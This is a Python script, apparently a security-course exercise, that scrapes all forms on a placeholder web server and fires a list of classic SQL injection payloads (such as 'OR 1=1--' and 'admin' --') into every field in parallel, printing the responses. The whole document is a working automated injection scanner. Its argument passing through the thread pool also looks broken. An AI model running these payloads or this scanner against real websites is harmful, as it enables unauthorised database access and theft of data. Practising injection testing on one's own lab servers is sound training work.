#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - We have setup a web server at http://XXX
# - Code a Python Script to scrape the HTML and
# - list all the forms and respective fields
# - try SQL Injection on each of the fields using a database of possibilities from a given file
# - submit the script and the form fields returning true for SQL Injection

import mechanicalsoup
import concurrent.futures

sql_injections = [
    '1',
    "1 ' OR 1=1",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "') OR ('1'='1--"
]


def multithreading(func, args, workers):
    with concurrent.futures.ThreadPoolExecutor(workers) as ex:
        res = ex.map(func, args)
    return list(res)


def sqli(url, form_number, field_name, sqli_value):
    print('Testing url: ', url, 'Form Number:', form_number, 'Field: ', field_name, 'Sqli value:', sqli_value)
    br = mechanicalsoup.StatefulBrowser()
    br.open(url)
    br.select_form(nr=form_number)
    br[field_name] = sqli_value
    br.submit_selected()
    htmlresult = br.get_current_page()

    # parse the results of the SQL Query with the BeatifulSoup
    for record in htmlresult.find_all('pre'):
        if record is not None:
            print(record)
    print('\n')


br = mechanicalsoup.StatefulBrowser()
args_list = []
url = 'http://XXX'
br.open(url)
for nr in range(1, 100):
    for field in br.select_form(nr=nr).form.find_all(
            ('input', 'textarea', 'select')):
        for sql_injection in sql_injections:
            args_list.append((url, nr, field.attrs['name'], sql_injection))

multithreading(sqli, args_list, 4)
